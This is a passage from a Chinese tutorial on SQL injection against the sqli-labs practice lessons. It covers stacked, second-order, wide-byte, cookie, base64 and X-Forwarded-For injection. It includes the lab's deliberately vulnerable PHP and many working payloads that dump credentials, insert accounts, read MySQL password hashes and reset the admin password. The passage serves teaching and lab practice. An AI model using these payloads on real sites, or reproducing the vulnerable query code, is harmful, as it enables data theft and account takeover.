get 参数的 id ，使用 mysqli 的方式进行数据查询，</p><p>在执行语句时候使用了 mysqli_multi_query 函数处理 sql 语句，导致存在堆叠注入。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include(&quot;../sql-connections/db-creds.inc&quot;);</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot; &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;</span><br><span class="line">&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot; /&gt;</span><br><span class="line">&lt;title&gt;Less-38 **stacked Query**&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=&quot;#000000&quot;&gt;</span><br><span class="line">&lt;div style=&quot; margin-top:70px;color:#FFF; font-size:23px; text-align:center&quot;&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=&quot;#FF0000&quot;&gt; Dhakkan &lt;/font&gt;&lt;br&gt;</span><br><span class="line">&lt;font size=&quot;3&quot; color=&quot;#FFFF00&quot;&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// take the variables </span><br><span class="line">if(isset($_GET[&#x27;id&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">$id=$_GET[&#x27;id&#x27;];</span><br><span class="line">//logging the connection parameters to a file for analysis.</span><br><span class="line">$fp=fopen(&#x27;result.txt&#x27;,&#x27;a&#x27;);</span><br><span class="line">fwrite($fp,&#x27;ID:&#x27;.$id.&quot;\n&quot;);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line">// connectivity</span><br><span class="line">//mysql connections for stacked query examples.</span><br><span class="line">$con1 = mysqli_connect($host,$dbuser,$dbpass,$dbname);</span><br><span class="line">// Check connection</span><br><span class="line">if (mysqli_connect_errno($con1))</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;Failed to connect to MySQL: &quot; . mysqli_connect_error();</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">    @mysqli_select_db($con1, $dbname) or die ( &quot;Unable to connect to the database: $dbname&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=&#x27;&#x27;1 and &#x27;1&#x27;=&#x27;1&#x27;--+ LIMIT 0,1&quot;;</span><br><span class="line">/* execute multi query */</span><br><span class="line">if (mysqli_multi_query($con1, $sql))</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    /* store first result set */</span><br><span class="line">    if ($result = mysqli_store_result($con1))</span><br><span class="line">    &#123;</span><br><span class="line">        if($row = mysqli_fetch_row($result))</span><br><span class="line">        &#123;</span><br><span class="line">            echo &#x27;&lt;font size = &quot;5&quot; color= &quot;#00FF00&quot;&gt;&#x27;;</span><br><span class="line">            printf(&quot;Your Username is : %s&quot;, $row[1]);</span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">            printf(&quot;Your Password is : %s&quot;, $row[2]);</span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">            echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">//            mysqli_free_result($result);</span><br><span class="line">    &#125;</span><br><span class="line">        /* print divider */</span><br><span class="line">    if (mysqli_more_results($con1))</span><br><span class="line">    &#123;</span><br><span class="line">            //printf(&quot;-----------------\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">     //while (mysqli_next_result($con1));</span><br><span class="line">&#125;</span><br><span class="line">else </span><br><span class="line">    &#123;</span><br><span class="line">echo &#x27;&lt;font size=&quot;5&quot; color= &quot;#FFFF00&quot;&gt;&#x27;;</span><br><span class="line">print_r(mysqli_error($con1));</span><br><span class="line">echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">    &#125;</span><br><span class="line">/* close connection */</span><br><span class="line">mysqli_close($con1);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">else &#123; echo &quot;Please input the ID as parameter with numeric value&quot;;&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;</span><br><span class="line">&lt;img src=&quot;../images/Less-38.jpg&quot; /&gt;&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="是否存在注入"><a href="#是否存在注入" class="headerlink" title="是否存在注入"></a>是否存在注入</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and 1=2 --+</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and 1=1 --+</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; order by 3 %23</span><br><span class="line"> </span><br><span class="line">-1&#x27;;show tables %23</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; order by 3 --+</span><br></pre></td></tr></table></figure><h5 id="获取库名"><a href="#获取库名" class="headerlink" title="获取库名"></a>获取库名</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,2,group_concat(user(),0x3A,database(),version()) --+</span><br></pre></td></tr></table></figure><p>接着使用使用堆叠语法进行检测</p><h5 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,2,(select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database() limit 0,1) --+</span><br></pre></td></tr></table></figure><h5 id="获取字段"><a href="#获取字段" class="headerlink" title="获取字段"></a>获取字段</h5><p>把库里所有的表获取出来，再获取字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; union select 1,2,(select group_concat(column_name) from information_schema.columns where TABLE_NAME=&#x27;users&#x27; limit 0,1) --+</span><br></pre></td></tr></table></figure><h5 id="插入普通账号"><a href="#插入普通账号" class="headerlink" title="插入普通账号"></a>插入普通账号</h5><p>知道表的列的情况下使用 insert into 插入语句进行增加账号。</p><p>如果是管理表就直接添加管理员账号即可登录后台。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;;insert into users(id,username,password)values(66,&#x27;蔡徐坤&#x27;,&#x27;小黑子树脂666&#x27;) --+</span><br></pre></td></tr></table></figure><p>访问 id=66即可访问到刚刚添加的账号</p><h5 id="插入mysql管理员账号"><a href="#插入mysql管理员账号" class="headerlink" title="插入mysql管理员账号"></a>插入mysql管理员账号</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;;insert into users(id,username,password)values(6666,(select authentication_string from mysql.user limit 1 ),&#x27;食不食油饼&#x27;) --+</span><br></pre></td></tr></table></figure><h3 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h3><p>二次注入是一种在Web应用程序中广泛存在的安全漏洞形式。</p><p>相对于一次注入漏洞而言，二次注入漏洞更难以被发现，但是它却具有与一次注入攻击漏洞相同的攻击威力。</p><h5 id="二次注入原理"><a href="#二次注入原理" class="headerlink" title="二次注入原理"></a>二次注入原理</h5><p>在第一次进行数据库插入数据的时候</p><p>仅仅只是使用了 addslashes 或者是借助 get_magic_quotes_gpc 函数对其中的特殊字符进行了转义’</p><p>但是addslashes有一个特点就是虽然参数在过滤后会添加 “\” 进行转义‘   \’</p><p>但是“\”并不会插入到数据库中，在写入数据库的时候还是保留了原来的数据。</p><p>在将数据存入到了数据库中之后，开发者就认为数据是可信的。</p><p>在下一次进行需要进行查询的时候，直接从数据库中取出了脏数据</p><p>没有进行进一步的检验和处理，这样就会造成SQL的二次注入</p><p>比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中</p><p>然后在下一次使用中在拼凑的过程中，就形成了二次注入。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">开了gpc add转义函数</span><br><span class="line">输入 admin&#x27; 转义成 admin\&#x27; 插入数据库  数据库将\去掉得到admin&#x27;</span><br><span class="line"></span><br><span class="line">存在&#x27;admin&#x27;&#x27;</span><br><span class="line"></span><br><span class="line">updata</span><br><span class="line"></span><br><span class="line">select * from users where name=&#x27;admin&#x27;&#x27;  二次注入</span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/8581772-b024d9bb4acded26.png?imageMogr2/auto-orient/strip|imageView2/2/w/854/format/webp" alt="img"></p><h5 id="代码分析-1"><a href="#代码分析-1" class="headerlink" title="代码分析"></a>代码分析</h5><p><img src="C:\Users\Hong\AppData\Roaming\Typora\typora-user-images\image-20220829152656226.png" alt="image-20220829152656226" style="zoom:80%;" />    </p><p>mysql_escape_string 函数会将特殊字符进行过滤 如’ 经过转义就成了\\’ 然后用insert into 存入在数据库中。</p><p>在 login.php 查看源码</p><p>登录获取用 mysql_escape_string 对输入的参数进行转义</p><p>转义之后在数据库中查找指定的账号和密码 再传入到 session 里。</p><p><img src="C:\Users\Hong\AppData\Roaming\Typora\typora-user-images\image-20220829152726983.png" alt="image-20220829152726983" style="zoom:80%;" /></p><p>在看 pass_change.php 源码</p><p><img src="C:\Users\Hong\AppData\Roaming\Typora\typora-user-images\image-20220829152747884.png" alt="image-20220829152747884" style="zoom:80%;" /></p><p>$_SESSION[‘username’] 复制给$username 无任何过滤再带入 UPDATE 语句中造成注入。</p><p>整个流程就是注册脏数据用户，再去更改密码时会触发注入。</p><p>触发注入呢我们就可以更改原有用户的密码</p><p>可以看到二次注入比较隐蔽。通常发生在更改，需要二次带入数据时提交的功能里。</p><h5 id="二次注入测试"><a href="#二次注入测试" class="headerlink" title="二次注入测试"></a>二次注入测试</h5><p>先确定测试的网站是否进行过滤，一般情况下网站都会对输入的参数进行过滤，</p><p>然后寻找可能会带入恶意数据二次使用的地方。</p><p>例如用户注册-&gt;修改密码-&gt;邮箱注册-&gt;修改密码-&gt; 文章添加-&gt;文章编辑</p><p>找一切存在二次使用的功能点。</p><p>二次注入测试 SQL 注入，二次注入多数是字符型注入，所以要注意闭合问题。</p><p>现在注册用户 a’ 再分别注册用户 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x27; and 1=1 #</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x27; and 1=2 # </span><br></pre></td></tr></table></figure><p>来可能触发的地方</p><p>二次注入多用于修改其他账号的密码 例如 admin 的密码。</p><p>注册用户 admin’ # 登录修改密码 就能修改 admin 的密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;UPDATE users SET PASSWORD=&#x27;$pass&#x27; where username=&#x27;admin&#x27;#&#x27; and password=&#x27;$curr_pass&#x27; &quot;;</span><br></pre></td></tr></table></figure><p>闭合 注释</p><h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><h5 id="常见几个url转码"><a href="#常见几个url转码" class="headerlink" title="常见几个url转码"></a>常见几个url转码</h5><p><strong>空格    %20</strong></p><p><strong>‘       %27</strong></p><p><strong>#      %23</strong></p><p><strong>/      %2f</strong></p><p><strong>%09    TAB 键（水平）</strong></p><p><strong>%0a    新建一行</strong></p><p><strong>%0b    TAB 键（垂直）</strong></p><p><strong>%0c    新的一页</strong></p><p><strong>%0d    return 功能</strong></p><p><strong>%a0    空格</strong></p><h5 id="php函数addslashes-gpc"><a href="#php函数addslashes-gpc" class="headerlink" title="php函数addslashes()   gpc"></a>php函数addslashes()   gpc</h5><p>作用：使用反斜线引用字符串</p><p>对以下生效生效：</p><p><strong>单引号：’</strong>     /’</p><p><strong>反斜线：/</strong>     //</p><p><strong>双引号：”</strong>   /“</p><p><strong>空值：NULL</strong>  /NULL</p><p>它会在这些之前加上反斜线，这样单引号就是字符串里面的一个，而没有单引号在代码中的作用</p><p>如何单引号逃逸？</p><ol><li>在反斜线之前再加一个反斜线，这样就把反斜线给转义了</li><li><strong>把反斜线弄没（即宽字节注入）</strong></li></ol><h5 id="宽字节手工注入"><a href="#宽字节手工注入" class="headerlink" title="宽字节手工注入"></a>宽字节手工注入</h5><p>宽字节注入，在 SQL 进行防注入的时候，一般会开启 gpc，过滤特殊字符。</p><p>一般情况下开启 gpc 是可以防御很多字符串型的注入，但是如果数据库编码不对，也可以导致 SQL 防注入绕过，达到注入的目的。</p><p>如果数据库设置宽字节字符集 gbk 会导致宽字节注入，从而逃逸 gpc</p><p>简单理解:数据库编码与 PHP 编码设置为不同的两个编码那么就有可能产生宽字节注入</p><p>深入讲解：要有宽字节注入漏洞，首先要满足数据库后端使用双/多字节解析 SQL语句</p><p>其次还要保证在该种字符集范围中包含低字节位是 0x5C(01011100) 的字符</p><p>初步的测试结果 Big5 和 GBK 字符集都是有的， UTF-8 和 GB2312 没有这种字符（也就不存在宽字节注入）</p><p>gpc 绕过过程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%df&#x27;===(addslashes函数)===&gt;%df%5c%27===(数据库 GBK编码)===&gt;運&#x27;</span><br></pre></td></tr></table></figure><h6 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h6><p>在url编码之后，如果%后面的两个字符的值（十六进制形式）超过了128（ascii码最大表示）</p><p>会默认为GBK形式，而Mysql在进行编码是认为GBK形式两个字符才算一个汉字</p><h6 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h6><p>单引号被反斜线转义：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27; --&gt; \&#x27; --&gt; %5C%27 </span><br></pre></td></tr></table></figure><p>当在单引号之前加上%aa时</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%aa&#x27; --&gt; %aa\&#x27; --&gt; %aa%5C%27   &#x27;大&#x27;&#x27;</span><br></pre></td></tr></table></figure><p>会认为%aa%5C是一对达到单引号的逃狱</p><h5 id="源代码分析"><a href="#源代码分析" class="headerlink" title="源代码分析"></a>源代码分析</h5><p>从源代码分析，存在漏洞的代码 首先 check_addlashes 是将特殊字符进行过滤</p><p>将’ 变成\\’ mysql_query 设置数据库的编码为 gbk 将 id 参数传入到 SQL 中带入查询</p><p>传入%df%5c%27 da’ 即可逃逸 gpc，故存在宽字节注入。</p><p><img src="C:\Users\19623\AppData\Roaming\Typora\typora-user-images\image-20220806191633158.png" alt="image-20220806191633158"></p><h5 id="黑盒环境下的宽字节攻击"><a href="#黑盒环境下的宽字节攻击" class="headerlink" title="黑盒环境下的宽字节攻击"></a>黑盒环境下的宽字节攻击</h5><p>宽字节检测较为简单 输入%df%27 检测即可或者使用配合 and 1=1 检测即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1%df%27%20and%201=1 --+</span><br></pre></td></tr></table></figure><p> 页面是否存在乱码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1%df%27%20or%20sleep(10)--+ </span><br></pre></td></tr></table></figure><p>页面是否存在延时</p><p>均可以测试存在宽字节注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1%df%27%20union%20select%201,version(),database()--+</span><br></pre></td></tr></table></figure><p><img src="C:\Users\19623\AppData\Roaming\Typora\typora-user-images\image-20220806191731698.png" alt="image-20220806191731698"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;1&#x27;\&#x27; and 1=2 --</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select 1,(select group_concat(column_name) from information_schema.columns where table_name =0x7573657273 ) --+</span><br></pre></td></tr></table></figure><h3 id="COOKIE注入"><a href="#COOKIE注入" class="headerlink" title="COOKIE注入"></a><strong>COOKIE</strong>注入</h3><p>COOKIE 注入与 GET、POST 注入区别不大，只是传递的方式不一样。</p><p>GET 在url 传递参数、POST 在 POST 正文传递参数和值，COOKIE 在 cookie 头传值。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">echo &quot;get ---&quot;;</span><br><span class="line"></span><br><span class="line">echo $_GET[&#x27;a&#x27;];</span><br><span class="line"></span><br><span class="line">echo &quot;post ---&quot;;</span><br><span class="line"></span><br><span class="line">echo $_POST[&#x27;b&#x27;];</span><br><span class="line"></span><br><span class="line">echo &quot;cookie ---&quot;;</span><br><span class="line"></span><br><span class="line">echo $_COOKIE[&#x27;c&#x27;];</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>get 在 url 拦截 即使 提交的方法是 post 只要在 url 拦上都可以传递 get</p><p>post 在正文里 提交的方法必须存在 post</p><p>cookie 有没有 post 都可以</p><h5 id="代码分析-2"><a href="#代码分析-2" class="headerlink" title="代码分析"></a>代码分析</h5><p>在Less20中判断是否提交submit 如果存在</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if(!isset($_POST[&#x27;submit&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">$cookee = $_COOKIE[&#x27;uname&#x27;];</span><br><span class="line">$format = &#x27;D d M Y - H:i:s&#x27;;</span><br><span class="line">$timestamp = time() + 3600;</span><br></pre></td></tr></table></figure><p>获取值</p><p>保存到$cookee 中 再拼接到 sql 带入查询。造成注入。</p><h5 id="注入攻击"><a href="#注入攻击" class="headerlink" title="注入攻击"></a>注入攻击</h5><p>主要是看看程序员有没有在cookie中做了一些过滤，我们有没有可趁之机。</p><p>cookie 功能多数用于商城购物车，或者用户登录验证，可以对这些功能模块进行测试</p><p>抓取 cookie 包进行安全测试</p><p>用cookie提交攻击语句可以看是否存在注入</p><p>使用 buspsuite 抓包 改包提交</p><p>输入 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cookie: &#x27; order by 4--+</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uname=admin&#x27; and 1=1 --+ </span><br><span class="line"></span><br><span class="line">uname=admin&#x27; and 1=2 --+ </span><br></pre></td></tr></table></figure><h3 id="Base64-编码注入"><a href="#Base64-编码注入" class="headerlink" title="Base64 编码注入"></a><strong>Base64</strong> 编码注入</h3><p>base64 一般用于数据编码进行传输，例如邮件，也用于图片加密存储在网页中。</p><p>数据编码的好处是，防止数据丢失，也有不少网站使用 base64 进行数据传输，</p><p>如搜索栏 或者 id 接收参数 有可能使用 base64 处理传递的参数。</p><p>在 php 中 base64_encode()函数对字符串进行 base64 编码,既然可以编码也可以进行解码</p><p>base64_decode()这个函数对 base64 进行解码。</p><p>编码解码流程</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1 -&gt;base64 编码-&gt;MQ==-&gt;base64 解密-&gt;1</span><br></pre></td></tr></table></figure><p>base64 编码注入，可以绕过 gpc 注入拦截，因为编码过后的字符串不存在特殊字符</p><p>编码过后的字符串，在程序中重新被解码，再拼接成 SQL 攻击语句再执行，从而形SQL 注入。</p><h5 id="代码中分析-base64-注入"><a href="#代码中分析-base64-注入" class="headerlink" title="代码中分析 base64 注入"></a>代码中分析 <strong>base64</strong> 注入</h5><p>从存在漏洞的代码中，首先判断是否有 POST 的 submit 参数过来如果有</p><p>使用$_COOKIE[‘uname’]获取 cookis 传过来的账号，再拼接到 SQL 带入查询。</p><p>这段代码的意思$cookee = base64_decode($cookee); 将$cookee 传过来的参数进</p><p>行解码，所以$cookee 传递过来的数据必须先进行编码，否则解码不了会导致出错。(‘’)</p><p><img src="C:\Users\Hong\AppData\Roaming\Typora\typora-user-images\image-20220830151637252.png" style="zoom:80%;" /></p><h5 id="黑盒环境下对-base64-编码进行注入"><a href="#黑盒环境下对-base64-编码进行注入" class="headerlink" title="黑盒环境下对 base64 编码进行注入"></a>黑盒环境下对 <strong>base64</strong> 编码进行注入</h5><p>首先观察网站是否存在 base64 编码的数据，例如传递的 id 的值，搜索模块。</p><p>如果存在类似==等，可以用 base64 解码进行测试。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;)and 1=1--+ 编码 YWRtaW4nYW5kIDE9MS0tIA==</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;)and 1=2--+ 编码 YWRtaW4nYW5kIDE9Mi0tIA==</span><br></pre></td></tr></table></figure><p>本次测试的页面是 cookie 所以需要 cookie 提交 而且有括号需要闭合</p><p>用 burpsuite 抓包后修改 cookie 参数提交</p><p>第一次提交页面返回存在 admin 第二次提交没有 admin 两个页面返回的结果不相同所以存在 SQL 注入</p><p>本代码存在 mysqli_error 函数所以可以里利用报错注入再进一步获取敏感信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin &#x27;) order by 4#</span><br></pre></td></tr></table></figure><p><img src="C:\Users\Hong\AppData\Roaming\Typora\typora-user-images\image-20220830152046971.png" alt="image-20220830152046971"></p><p>注意闭合方式(‘’)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 &#x27; ) union select 1,database(),user()-- </span><br></pre></td></tr></table></figure><p>注意注释 空格也会被编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; ) union select 1,2,group_concat(user(),0x3A,database(),version())#</span><br></pre></td></tr></table></figure><p>获取库名</p><p>获取security库中的表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 &#x27;) union select 1,2, (select group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27;)#</span><br></pre></td></tr></table></figure><p>获取users表中的字段名</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27; ) union select 1,2,(select group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27;)# </span><br><span class="line"></span><br><span class="line">获取username和password的字段值</span><br><span class="line">-1&#x27;) union select 1,2,(select group_concat(id,username,0x3a,password) from users limit 1)#</span><br><span class="line"></span><br><span class="line">-1&#x27;) union select 1,2,(select group_concat(username,&#x27;:&#x27;,password) from security.users)# </span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27;)and (updatexml(1,concat(0x7e,(select database()),0x7e),1))--  </span><br></pre></td></tr></table></figure><p>报错信息回显</p><p>进行 base64 编码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YWRtaW4nKWFuZCAodXBkYXRleG1sKDEsY29uY2F0KDB4N2UsKHNlbGVjdCB1c2VyKCkpLDB4N2UpLDEpKS0tICA=</span><br></pre></td></tr></table></figure><p>提交获取敏感信息。 </p><h3 id="XXF-注入攻击"><a href="#XXF-注入攻击" class="headerlink" title="XXF 注入攻击"></a><strong>XXF</strong> 注入攻击</h3><p>X-Forwarded-For 简称 XFF 头，它代表了客户端的真实 IP，通过修改他的值就可以伪造客户端 IP</p><p>XFF 并不受 gpc 影响，而且开发人员很容易忽略这个 XFF 头，</p><p>不会对 XFF 头进行过滤。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">echo &quot;xff---&quot;.$_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;];</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>使用 burpsuite</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-for: 9.9.9.9 </span><br></pre></td></tr></table></figure><p>可以随意设置字符串，如果程序中获取这个值再带入数据库查询 会造成 SQL 注入</p><p>除了 X-Forwarded-For 还有 HTTP_CLIENT_IP 都可以由客户端控制值</p><p>所以服务端接受这两个参数的时候 没有过滤会造成 SQL 注入或者更高的危害</p><h5 id="xff-注入代码分析"><a href="#xff-注入代码分析" class="headerlink" title="xff 注入代码分析"></a><strong>xff</strong> 注入代码分析</h5><p><img src="https://img-blog.csdnimg.cn/91790b4f875c441f90e2e565a21d3230.png#pic_center" alt="在这里插入图片描述"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 